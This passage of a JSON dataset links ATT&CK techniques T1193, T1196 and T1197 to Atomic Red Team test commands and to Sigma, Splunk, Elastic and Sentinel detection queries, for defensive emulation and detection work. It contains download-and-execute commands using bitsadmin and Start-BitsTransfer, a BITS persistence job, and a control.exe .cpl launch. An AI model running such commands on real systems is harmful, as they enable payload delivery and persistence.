experimental\ndescription: Detects a suspicious program execution in Outlook temp folder\nauthor: Florian Roth\ndate: 2019/10/01\ntags:\n    - attack.initial_access\n    - attack.t1193\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\Temporary Internet Files\\Content.Outlook\\\\*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Image.keyword:*\\\\\\\\Temporary\\\\ Internet\\\\ Files\\\\\\\\Content.Outlook\\\\\\\\*", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Execution-in-Outlook-Temp-Folder <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Execution in Outlook Temp Folder\",\\n    \"description\": \"Detects a suspicious program execution in Outlook temp folder\",\\n    \"tags\": [\\n      \"attack.initial_access\",\\n      \"attack.t1193\"\\n    ],\\n    \"query\": \"Image.keyword:*\\\\\\\\\\\\\\\\Temporary\\\\\\\\ Internet\\\\\\\\ Files\\\\\\\\\\\\\\\\Content.Outlook\\\\\\\\\\\\\\\\*\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Image.keyword:*\\\\\\\\\\\\\\\\Temporary\\\\\\\\ Internet\\\\\\\\ Files\\\\\\\\\\\\\\\\Content.Outlook\\\\\\\\\\\\\\\\*\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Execution in Outlook Temp Folder\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Image.keyword:*\\\\\\\\Temporary Internet Files\\\\\\\\Content.Outlook\\\\\\\\*", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "Image=\"*\\\\\\\\Temporary Internet Files\\\\\\\\Content.Outlook\\\\\\\\*\" | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\Temporary Internet Files\\\\\\\\Content.Outlook\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.*\\\\Temporary Internet Files\\\\Content\\\\.Outlook\\\\\\\\.*'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1196/T1196.yaml", "command": "control.exe PathToAtomicsFolder\\T1196\\bin\\calc.cpl\n", "name": null}, {"source": "SysmonHunter - Control Panel Items", "command": "\\\\Windows\\\\.+\\\\control.exe", "name": null}, {"source": "SysmonHunter - Control Panel Items", "command": "Shell32.dll,Control_RunDLLAsUser|.cpl", "name": null}], "command_list": ["control.exe PathToAtomicsFolder\\T1196\\bin\\calc.cpl\n", "\\\\Windows\\\\.+\\\\control.exe", "Shell32.dll,Control_RunDLLAsUser|.cpl"], "technique_id": "T1196", "parsed_datasets": [{"Atomic Red Team Test - Control Panel Items": {"display_name": "Control Panel Items", "atomic_tests": [{"dependencies": [{"description": "Cpl file must exist on disk at specified location (#{cpl_file_path})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{cpl_file_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1196/bin/calc.cpl\" -OutFile \"#{cpl_file_path}\"\n", "prereq_command": "if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Control Panel Items", "executor": {"elevation_required": false, "command": "control.exe #{cpl_file_path}\n", "name": "command_prompt"}, "description": "This test simulates an adversary leveraging control.exe to execute a payload and pops calc\n", "input_arguments": {"cpl_file_path": {"default": "PathToAtomicsFolder\\T1196\\bin\\calc.cpl", "type": "path", "description": "path to cpl file"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1196"}}, {"SysmonHunter - T1196": {"phase": "Execution", "query": [{"process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\control.exe", "flag": "regex"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "Shell32.dll,Control_RunDLLAsUser|.cpl", "op": "and"}}, "type": "process"}], "description": null, "name": "Control Panel Items", "level": "medium"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_command_line contains \"control \\\\/name\"or process_commandline contains \"rundll32 shell32.dll,Control_RunDLL\")", "product": "Azure Sentinel", "name": "Control Panel Items Process"}, {"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\ControlPanel\\\\NameSpace\"or registry_key_path contains \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Controls Folder\\\\*\\\\Shellex\\\\PropertySheetHandlers\\\\\"or registry_key_path contains \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Control Panel\\\\\")", "product": "Azure Sentinel", "name": "Control Panel Items Registry"}, {"query": "title: Control Panel Items\nstatus: experimental\ndescription: Detects the use of a control panel item (.cpl) outside of the System32 folder\nreference: \n  - https://attack.mitre.org/techniques/T1196/\ntags: \n  - attack.execution\n  - attack.t1196\n  - attack.defense_evasion\nauthor: Kyaw Min Thein\ndate: 2019/08/27\nlevel: critical\nlogsource:\n  product: windows\n  service: sysmon\ndetection:\n  selection:\n    CommandLine: '*.cpl'\n  filter:\n    CommandLine:\n      - '*\\System32\\\\*'\n      - '*%System%*'\n  condition: selection and not filter\nfalsepositives:\n  - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Control Panel Items\nstatus: experimental\ndescription: Detects the use of a control panel item (.cpl) outside of the System32 folder\nreference: \n  - https://attack.mitre.org/techniques/T1196/\ntags: \n  - attack.execution\n  - attack.t1196\n  - attack.defense_evasion\nauthor: Kyaw Min Thein\ndate: 2019/08/27\nlevel: critical\nlogsource:\n  product: windows\n  service: sysmon\ndetection:\n  selection:\n    CommandLine: '*.cpl'\n  filter:\n    CommandLine:\n      - '*\\System32\\\\*'\n      - '*%System%*'\n  condition: selection and not filter\nfalsepositives:\n  - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*.cpl AND (NOT (CommandLine.keyword:(*\\\\\\\\System32\\\\\\\\* OR *%System%*))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Control-Panel-Items <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Control Panel Items\",\\n    \"description\": \"Detects the use of a control panel item (.cpl) outside of the System32 folder\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1196\",\\n      \"attack.defense_evasion\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:*.cpl AND (NOT (CommandLine.keyword:(*\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR *%System%*))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*.cpl AND (NOT (CommandLine.keyword:(*\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR *%System%*))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Control Panel Items\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine:\"*.cpl\" AND NOT (CommandLine:(\"*\\\\\\\\System32\\\\\\\\*\" \"*%System%*\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*.cpl\" NOT ((CommandLine=\"*\\\\\\\\System32\\\\\\\\*\" OR CommandLine=\"*%System%*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(CommandLine=\"*.cpl\"  -(CommandLine IN [\"*\\\\\\\\System32\\\\\\\\*\", \"*%System%*\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\.cpl)(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\System32\\\\\\\\.*|.*.*%System%.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Control Panel Items\nid: 0ba863e6-def5-4e50-9cea-4dd8c7dc46a4\nstatus: experimental\ndescription: Detects the use of a control panel item (.cpl) outside of the System32 folder\nreference:\n    - https://attack.mitre.org/techniques/T1196/\ntags:\n    - attack.execution\n    - attack.t1196\n    - attack.defense_evasion\nauthor: Kyaw Min Thein\ndate: 2019/08/27\nlevel: critical\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine: '*.cpl'\n    filter:\n        CommandLine:\n            - '*\\System32\\\\*'\n            - '*%System%*'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Control Panel Items\nid: 0ba863e6-def5-4e50-9cea-4dd8c7dc46a4\nstatus: experimental\ndescription: Detects the use of a control panel item (.cpl) outside of the System32 folder\nreference:\n    - https://attack.mitre.org/techniques/T1196/\ntags:\n    - attack.execution\n    - attack.t1196\n    - attack.defense_evasion\nauthor: Kyaw Min Thein\ndate: 2019/08/27\nlevel: critical\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine: '*.cpl'\n    filter:\n        CommandLine:\n            - '*\\System32\\\\*'\n            - '*%System%*'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*.cpl AND (NOT (CommandLine.keyword:(*\\\\\\\\System32\\\\\\\\* OR *%System%*))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Control-Panel-Items <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Control Panel Items\",\\n    \"description\": \"Detects the use of a control panel item (.cpl) outside of the System32 folder\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1196\",\\n      \"attack.defense_evasion\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:*.cpl AND (NOT (CommandLine.keyword:(*\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR *%System%*))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*.cpl AND (NOT (CommandLine.keyword:(*\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR *%System%*))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Control Panel Items\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:*.cpl AND (NOT (CommandLine.keyword:(*\\\\\\\\System32\\\\\\\\* *%System%*))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*.cpl\" NOT ((CommandLine=\"*\\\\\\\\System32\\\\\\\\*\" OR CommandLine=\"*%System%*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"*.cpl\"  -(CommandLine IN [\"*\\\\\\\\System32\\\\\\\\*\", \"*%System%*\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\.cpl)(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\System32\\\\\\\\.*|.*.*%System%.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin_flag.ps1\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination #{local_file}\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\\bitsadmin_flag.ps1\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /create AtomicBITS\nbitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}\nbitsadmin.exe /setnotifycmdline AtomicBITS #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume AtomicBITS\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} %temp%\\bitsadmin_flag.ps1\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} %temp%\\bitsadmin_flag.ps1\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} %temp%\\bitsadmin_flag.ps1\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "name": null}, {"source": "atomics/T1197/T1197.yaml", "command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} C:\\Windows\\system32\\notepad.exe #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "name": null}, {"source": "SysmonHunter - BITS Jobs", "command": "bitsadmin.exe", "name": null}], "command_list": ["bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}\n", "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin_flag.ps1\n", "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination #{local_file}\n", "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\\bitsadmin_flag.ps1\n", "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "bitsadmin.exe /create AtomicBITS\nbitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md #{local_file}\nbitsadmin.exe /setnotifycmdline AtomicBITS #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume AtomicBITS\n", "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} %temp%\\bitsadmin_flag.ps1\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} %temp%\\bitsadmin_flag.ps1\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} %temp%\\bitsadmin_flag.ps1\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} C:\\Windows\\system32\\notepad.exe #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "bitsadmin.exe"], "technique_id": "T1197", "parsed_datasets": [{"Atomic Red Team Test - BITS Jobs": {"display_name": "BITS Jobs", "atomic_tests": [{"description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n", "supported_platforms": ["windows"], "name": "Download & Execute", "input_arguments": {"remote_file": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md", "type": "url", "description": "Remote file to download"}, "local_file": {"default": "%temp%\\bitsadmin_flag.ps1", "type": "path", "description": "Local file path to save downloaded file"}}, "executor": {"command": "bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}\n", "name": "command_prompt", "cleanup_command": "del #{local_file} >nul 2>&1\n"}}, {"description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n", "supported_platforms": ["windows"], "name": "Download & Execute via PowerShell BITS", "input_arguments": {"remote_file": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md", "type": "url", "description": "Remote file to download"}, "local_file": {"default": "$env:TEMP\\bitsadmin_flag.ps1", "type": "path", "description": "Local file path to save downloaded file"}}, "executor": {"command": "Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}\n", "name": "powershell", "cleanup_command": "Remove-Item #{local_file} -ErrorAction Ignore\n"}}, {"description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer\nand execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.\n", "supported_platforms": ["windows"], "name": "Persist, Download, & Execute", "input_arguments": {"remote_file": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md", "type": "url", "description": "Remote file to download"}, "bits_job_name": {"default": "AtomicBITS", "type": "string", "description": "Name of BITS job"}, "local_file": {"default": "%temp%\\bitsadmin_flag.ps1", "type": "path", "description": "Local file path to save downloaded file"}, "command_line": {"default": "%temp%\\bitsadmin_flag.ps1", "type": "string", "description": "Command line to execute"}, "command_path": {"default": "C:\\Windows\\system32\\notepad.exe", "type": "path", "description": "Path of command to execute"}}, "executor": {"command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}\nbitsadmin.exe /complete AtomicBITS\nbitsadmin.exe /resume #{bits_job_name}\n", "name": "command_prompt"}}], "attack_technique": "T1197"}}, {"SysmonHunter - T1197": {"phase": "Execution", "query": [{"process": {"any": {"pattern": "bitsadmin.exe"}}, "type": "process"}], "description": null, "name": "BITS Jobs", "level": "medium"}}], "queries": [{"query": "Sysmon| where EventID == 3and process_path contains \"bitsadmin.exe\"", "product": "Azure Sentinel", "name": "BITS Jobs Network"}, {"query": "Sysmon| where EventID == 1and (process_path contains \"bitsamin.exe\"or process_command_line contains \"Start-BitsTransfer\")", "product": "Azure Sentinel", "name": "BITS Jobs Process"}, {"query": "title: Suspicious Bitsadmin Job via PowerShell\nid: f67dbfce-93bc-440d-86ad-a95ae8858c90\nstatus: experimental\ndescription: Detect download by BITS jobs via PowerShell\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/ec5180c9-721a-460f-bddc-27539a284273.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md\nauthor: Endgame, JHasenbusch (ported to sigma for oscd.community)\ndate: 2018/10/30\nmodified: 2019/11/11\ntags:\n    - attack.defense_evasion\n    - attack.persistence\n    - attack.t1197\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains: 'Start-BitsTransfer'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Bitsadmin Job via PowerShell\nid: f67dbfce-93bc-440d-86ad-a95ae8858c90\nstatus: experimental\ndescription: Detect download by BITS jobs via PowerShell\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/ec5180c9-721a-460f-bddc-27539a284273.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md\nauthor: Endgame, JHasenbusch (ported to sigma for oscd.community)\ndate: 2018/10/30\nmodified: 2019/11/11\ntags:\n    - attack.defense_evasion\n    - attack.persistence\n    - attack.t1197\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains: 'Start-BitsTransfer'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:*Start\\\\-BitsTransfer*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Bitsadmin-Job-via-PowerShell <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Bitsadmin Job via PowerShell\",\\n    \"description\": \"Detect download by BITS jobs via PowerShell\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.persistence\",\\n      \"attack.t1197\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:*Start\\\\\\\\-BitsTransfer*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:*Start\\\\\\\\-BitsTransfer*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Bitsadmin Job via PowerShell\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:*Start\\\\-BitsTransfer*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\powershell.exe\" CommandLine=\"*Start-BitsTransfer*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\powershell.exe\" CommandLine=\"*Start-BitsTransfer*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\powershell\\\\.exe)(?=.*.*Start-BitsTransfer.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Bitsadmin Download\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: experimental\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\ntags:\n    - attack.defense_evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\ndate: 2017/03/09\nmodified: 2019/12/06\nauthor: Michael Haag\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image:\n            - '*\\bitsadmin.exe'\n        CommandLine:\n            - '* /transfer *'\n    selection2:\n        CommandLine:\n            - '*copy bitsadmin.exe*'\n    condition: selection1 or selection2\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Bitsadmin Download\nid: d059842b-6b9d-4ed1-b5c3-5b89143c6ede\nstatus: experimental\ndescription: Detects usage of bitsadmin downloading a file\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\ntags:\n    - attack.defense_evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\ndate: 2017/03/09\nmodified: 2019/12/06\nauthor: Michael Haag\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image:\n            - '*\\bitsadmin.exe'\n        CommandLine:\n            - '* /transfer *'\n    selection2:\n        CommandLine:\n            - '*copy bitsadmin.exe*'\n    condition: selection1 or selection2\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: medium", "product": "Atomic Threat 